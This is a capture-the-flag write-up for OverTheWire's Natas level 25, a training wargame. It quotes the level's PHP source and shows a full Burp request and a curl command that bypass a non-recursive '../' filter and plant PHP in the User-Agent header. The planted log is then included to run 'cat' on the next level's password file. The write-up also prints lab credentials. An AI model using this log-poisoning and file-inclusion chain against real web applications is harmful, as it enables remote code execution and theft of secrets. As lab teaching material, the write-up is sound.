# Natas Level 25

> Username: natas25

> Password: UJEF5OAHF1eW3lqkpdCDM7ow4syzh4oo

> URL: http://natas25.natas.labs.overthewire.org

## Solution

Entering the URL, we found a Quote, and when we change the language the parameter `?lang=` added. Which mean it reads a file in specific location on the server. So let's view the source code to find out.

```php
<?php
    // cheers and <3 to malvina
    // - morla

    function setLanguage(){
        /* language setup */
        if(array_key_exists("lang",$_REQUEST))
            if(safeinclude("language/" . $_REQUEST["lang"] ))
                return 1;
        safeinclude("language/en"); 
    }
    
    function safeinclude($filename){
        // check for directory traversal
        if(strstr($filename,"../")){
            logRequest("Directory traversal attempt! fixing request.");
            $filename=str_replace("../","",$filename);
        }
        // dont let ppl steal our passwords
        if(strstr($filename,"natas_webpass")){
            logRequest("Illegal file access detected! Aborting!");
            exit(-1);
        }
        // add more checks...

        if (file_exists($filename)) { 
            include($filename);
            return 1;
        }
        return 0;
    }
    
    function listFiles($path){
        $listoffiles=array();
        if ($handle = opendir($path))
            while (false !== ($file = readdir($handle)))
                if ($file != "." && $file != "..")
                    $listoffiles[]=$file;
        
        closedir($handle);
        return $listoffiles;
    } 
    
    function logRequest($message){
        $log="[". date("d.m.Y H::i:s",time()) ."]";
        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
        $log=$log . " \"" . $message ."\"\n"; 
        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
        fwrite($fd,$log);
        fclose($fd);
    }
?>
```

Reading the code you can found multiple vulnerabilities.

First the Flawed `Directory Traversal` Filter.

```php
if(strstr($filename,"../")){
    logRequest("Directory traversal attempt! fixing request.");
    $filename=str_replace("../","",$filename);
}
```

The `str_replace()` function is not recursive. It strips out `../` exactly once, processing left-to-right. So if we double it `....//` this must bypass the filter.

But the code also attempts to block you from directly reading the password file. So we can't simply use `....//....//....//....//etc/natas_webpass/natas26`.

Here comes the another vulnerability which is `Log Poisoning`.

```php
function logRequest($message){
	$log="[". date("d.m.Y H::i:s",time()) ."]";
	$log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
	$log=$log . " \"" . $message ."\"\n"; 
	$fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
	fwrite($fd,$log);
	fclose($fd);
}
```

When a directory traversal attempt triggers the filter, it writes entry logs to a file based on your active session ID.

This logs your browser's `User-Agent` string into a text file completely raw.
If you modify your request's HTTP User-Agent to contain valid PHP code like `<?php system('cat /etc/natas_webpass/natas26'); ?>`), that executable code will be written directly into the log file.
You can then use the nested directory traversal exploit `....//` to point the `lang` parameter to your own session log file. When `include($filename)` loads your log file, PHP will parse and execute your injected User-Agent command.

You can use `Burp Suit` to update the request, it will be like this:

```text
GET /?lang=....//....//....//....//....//....//....//....//....//....//var/www/natas/natas25/logs/natas25_colil3fgsqrhms4dkl57i4hc9j.log HTTP/1.1
Host: natas25.natas.labs.overthewire.org
Authorization: Basic bmF0YXMyNTpVSkVGNU9BSEYxZVczbHFrcGRDRE03b3c0c3l6aDRvbw==
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: <?php system('cat /etc/natas_webpass/natas26'); ?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=colil3fgsqrhms4dkl57i4hc9j
Connection: keep-alive
```

Or you can use `curl`, and it will be like this:

```shell
curl -u natas25:UJEF5OAHF1eW3lqkpdCDM7ow4syzh4oo -H "User-Agent: <?php passthru('cat /etc/natas_webpass/natas26'); ?>" "http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//....//....//....//....//....//var/www/natas/natas25/logs/natas25_colil3fgsqrhms4dkl57i4hc9j.log"
```

And this is what we need:

```text
[06.11.2026 16::17:34] 3CApdpjqI4UYPxY8mHQWUdFPGH9BoUTT
 "Directory traversal attempt! fixing request."
```

```text
3CApdpjqI4UYPxY8mHQWUdFPGH9BoUTT
```

